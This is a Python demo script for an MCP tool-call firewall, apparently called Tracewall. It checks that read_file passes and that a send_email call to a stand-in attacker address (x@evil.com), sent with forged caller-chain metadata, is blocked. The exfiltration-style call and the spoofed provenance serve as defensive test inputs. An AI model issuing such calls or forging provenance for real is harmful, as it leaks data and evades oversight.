"""
Reference MCP PEP demo — Tracewall is the only path to the toy MCP server.

Runs an in-process screen (same code path as the stdio proxy) against
``tools/call`` messages, then optionally drives the real ``mcp_proxy``
subprocess against ``toy_mcp_server.py``.

Usage (from repo root):

  py -3.12 examples/reference_mcp_app/run_pep_demo.py
  py -3.12 examples/reference_mcp_app/run_pep_demo.py --subprocess

Expect: read_file ALLOW; send_email to evil.com BLOCK under --profile zta.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from tracewall.audit.sink import NullAuditSink
from tracewall.core.signal import IdentityCtx
from tracewall.ops.metrics import Metrics
from tracewall.transports.mcp_proxy import ProxyConfig, screen_tool_call
from tracewall.transports.profiles import build_firewall_for_profile
from tracewall.transports.session_chain import SessionCallTree


def _tools_call(req_id, name: str, arguments: dict, *, agent_id: str, session_id: str = "s1") -> dict:
    return {
        "jsonrpc": "2.0",
        "id": req_id,
        "method": "tools/call",
        "params": {
            "name": name,
            "arguments": arguments,
            "_meta": {
                "tracewall": {
                    "agent_id": agent_id,
                    "session_id": session_id,
                    # Forged chain — zta own_call_tree must ignore this
                    "caller_chain": ["read_file", "read_secret"],
                }
            },
        },
    }


async def run_inprocess(profile: str) -> int:
    os.environ.setdefault("TRACEWALL_ORG_DOMAINS", "acme.com")
    os.environ["TRACEWALL_SEMANTIC_LLM"] = "0"
    td = tempfile.mkdtemp()
    db = str(Path(td) / "tw.db")
    metrics = Metrics()
    fw, prof = await build_firewall_for_profile(profile, db_path=db, audit=NullAuditSink())
    fw.metrics = metrics
    await fw._ledger.register_identity(
        IdentityCtx(agent_id="pep-demo", caps=["read_file", "send_email"], trust=0.9)
    )
    cfg = prof.proxy_config(default_agent_id="pep-demo")
    tree = SessionCallTree()

    allow_msg = _tools_call(1, "read_file", {"path": "/ok"}, agent_id="pep-demo")
    blocked = await screen_tool_call(fw, allow_msg, cfg, call_tree=tree)
    print("read_file:", "BLOCK" if blocked else "ALLOW (forward to server)")
    if blocked is not None:
        print("  unexpected block:", blocked)
        return 1

    deny_msg = _tools_call(2, "send_email", {"to": "x@evil.com", "body": "hi"}, agent_id="pep-demo")
    blocked = await screen_tool_call(fw, deny_msg, cfg, call_tree=tree)
    print("send_email evil:", "BLOCK" if blocked else "ALLOW (unexpected)")
    if blocked is None:
        return 1
    text = blocked["result"]["content"][0]["text"]
    print("  mcp error:", text[:120])
    snap = metrics.snapshot()
    print(f"metrics: n_check={snap.n_check} n_block={snap.n_block} block_rate={snap.block_rate:.2f}")
    print(f"ok: PEP path proven (profile={prof.name} own_call_tree={cfg.own_call_tree})")
    return 0


async def run_subprocess(profile: str) -> int:
    """Drive real mcp_proxy ↔ toy_mcp_server over stdio (one allow, one block)."""
    os.environ.setdefault("TRACEWALL_ORG_DOMAINS", "acme.com")
    os.environ["TRACEWALL_SEMANTIC_LLM"] = "0"
    td = tempfile.mkdtemp()
    db = str(Path(td) / "tw.db")

    # Pre-register identity in the same DB the proxy will open
    fw, _ = await build_firewall_for_profile(profile, db_path=db, audit=NullAuditSink())
    await fw._ledger.register_identity(
        IdentityCtx(agent_id="pep-demo", caps=["read_file", "send_email"], trust=0.9)
    )
    # Close ledger before proxy opens the same SQLite file (Windows lock)
    if fw._ledger._db is not None:
        await fw._ledger._db.close()
        fw._ledger._db = None

    toy = Path(__file__).resolve().parent / "toy_mcp_server.py"
    py = sys.executable
    cmd = [
        py, "-m", "tracewall.transports.mcp_proxy",
        "--profile", profile,
        "--db", db,
        "--agent-id", "pep-demo",
        "--",
        py, str(toy),
    ]
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=str(ROOT),
    )
    assert proc.stdin and proc.stdout

    async def send(obj: dict) -> None:
        proc.stdin.write((json.dumps(obj) + "\n").encode())
        await proc.stdin.drain()

    async def recv() -> dict:
        line = await proc.stdout.readline()
        if not line:
            err = await proc.stderr.read()
            raise RuntimeError(f"proxy closed early: {err.decode(errors='replace')[:500]}")
        return json.loads(line)

    await send({
        "jsonrpc": "2.0", "id": 0, "method": "initialize",
        "params": {"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "demo", "version": "0"}},
    })
    init = await recv()
    assert "result" in init, init

    await send(_tools_call(1, "read_file", {"path": "/ok"}, agent_id="pep-demo"))
    r1 = await recv()
    print("subprocess read_file:", r1.get("result", {}).get("content", [{}])[0].get("text", r1)[:80])

    await send(_tools_call(2, "send_email", {"to": "x@evil.com", "body": "hi"}, agent_id="pep-demo"))
    r2 = await recv()
    err = (r2.get("result") or {}).get("isError")
    text = (r2.get("result") or {}).get("content", [{}])[0].get("text", "")
    print("subprocess send_email:", "BLOCK" if err else "ALLOW", text[:100])
    proc.stdin.close()
    try:
        await asyncio.wait_for(proc.wait(), timeout=5)
    except asyncio.TimeoutError:
        proc.kill()
    if not err:
        return 1
    print("ok: subprocess PEP path proven")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Tracewall reference MCP PEP demo")
    ap.add_argument("--profile", default="zta")
    ap.add_argument("--subprocess", action="store_true", help="also drive real mcp_proxy")
    args = ap.parse_args(argv)

    async def _all() -> int:
        rc = await run_inprocess(args.profile)
        if rc != 0:
            return rc
        if args.subprocess:
            return await run_subprocess(args.profile)
        return 0

    return asyncio.run(_all())


if __name__ == "__main__":
    raise SystemExit(main())
